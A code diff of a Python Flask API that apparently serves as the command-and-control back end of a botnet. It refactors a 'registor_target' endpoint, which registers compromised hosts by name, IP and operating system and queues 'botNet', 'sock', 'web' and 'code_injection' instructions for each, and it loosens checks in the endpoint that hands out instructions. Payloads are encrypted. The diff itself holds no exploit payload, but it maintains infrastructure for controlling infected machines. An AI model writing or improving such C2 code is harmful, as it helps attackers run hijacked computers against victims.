@@ -273,63 +273,83 @@ def BotNet(target_name):
         return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
+
 @api.route('/api/v1.2/registor_target', methods=['POST'])
 def registor_target():
-    """API endpoint to register a new target with the API.
-    This endpoint allows a new target to be registered by providing an API token,
-    target name, IP address, and operating system.
-    Args:
-        token (str): The API token for authentication.
-        target_name (str): The name of the target to be registered.
-        ip (str): The IP address of the target.
-        os (str): The operating system of the target.
-    Returns:
-        JSON response indicating success or failure.
-        If the API token is valid and the target is registered successfully, it returns the target name.
-        If the API token or target name is invalid or not provided, it returns an error message.
-    """
-    _session = SessionLocal()
-    if request.method == 'POST':
-        try:
-            data = decrypt_payload(request.json)
+    """Register a new target with the API."""
+    _session = None
 
-            apitoken = data.get('token')
-            target_name = data.get('target_name')
-            IP = data.get('ip')
-            opratingSystem = data.get('os')
+    try:
+        _session = SessionLocal()
 
-            if not apitoken or not target_name:
-                return jsonify(encrypt_payload({'Error': 'Token or target_name not provided'})), 400
+        data = decrypt_payload(request.json or {})
 
-            valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
-            if len(valid) != 0:
-                target_name = target_name + str(datetime.now()).replace(' ', '')
-                target = Targets(config.ID(), target_name, valid[0][2].replace(' ', ''), apitoken)
-                _session.add(target)
-                _session.commit()
-                update_target_info(target_name, IP, opratingSystem)
+        apitoken = data.get('token')
+        target_name = data.get('target_name')
+        IP = data.get('ip')
+        opratingSystem = data.get('os')
 
-                botNet = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[2], config.STUTAS[1])
-                sock = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[1], config.STUTAS[1])
-                web = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[0], config.STUTAS[1])
-                code_injection = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[3], config.STUTAS[1])
+        if not apitoken or not target_name:
+            return jsonify(encrypt_payload({
+                'Error': 'Token or target_name not provided'
+            })), 400
 
-                _session.add(botNet)
-                _session.add(sock)
-                _session.add(web)
-                _session.add(code_injection)
-                _session.commit()
+        valid = getlist(
+            _session.query(ApiToken).filter_by(token=apitoken).all(),
+            sp=','
+        )
 
-                return jsonify(encrypt_payload({'target_name': target_name})), 200
-            else:
-                return jsonify(encrypt_payload({'Error': 'Invalid api_token'})), 403
-        except Exception as e:
+        if not valid:
+            return jsonify(encrypt_payload({
+                'Error': 'Invalid api_token'
+            })), 403
+
+        target_name = target_name + str(datetime.now()).replace(' ', '')
+
+        target = Targets(
+            config.ID(),
+            target_name,
+            valid[0][2].replace(' ', ''),
+            apitoken
+        )
+
+        _session.add(target)
+        _session.commit()
+
+        update_target_info(target_name, IP, opratingSystem)
+
+        instructions = [
+            Instraction(
+                config.ID(),
+                config.DELAY,
+                target_name,
+                config.INSTRACTION[index],
+                config.STUTAS[1]
+            )
+            for index in (2, 1, 0, 3)
+        ]
+
+        _session.add_all(instructions)
+        _session.commit()
+
+        return jsonify(encrypt_payload({
+            'target_name': target_name
+        })), 200
+
+    except Exception as e:
+        if _session is not None:
             _session.rollback()
-            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-            return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
-        finally:
+
+        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+
+        return jsonify(encrypt_payload({
+            'Error': 'Internal server error'
+        })), 500
+
+    finally:
+        if _session is not None:
             _session.close()
-    return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provide target name"})), 405
+
 
 
 @api.route('/api/v1.2/get_instraction/<target_name>')
@@ -386,12 +406,12 @@ def instarction(target_name):
                 instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, status=config.STUTAS[0]).all(), sp=',')
                 user_instractions = getlist(_session.query(Instruction_Detail).filter_by(userEmail=user_email).all(), sp=',')
 
-                if len(valid) != 0 and len(instraction) != 0:
+                if len(valid) != 0:
                     print(len(instraction), instraction)
                     
                     user_instraction = {
-                        'instraction': instraction[0][3],
-                        'Delay': instraction[0][1],
+                        'instraction': instraction[0][3] if instraction else None,
+                        'Delay': instraction[0][1] if instraction else None,
                         'user_instarcton':{},
                         'sys_instraction': {}
                     }
@@ -440,7 +460,7 @@ def instarction(target_name):
                     else:
                         return jsonify(encrypt_payload(user_instraction)), 200
                 else:
-                    print('------ api_token:', token, valid)
+                    print('------>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> api_token:', token, valid)
                     return jsonify(encrypt_payload({'Error': 'Invalid api_token. please provide a valid api token'})), 403
             else:
                 return jsonify({'Message': 'not target found'}),404
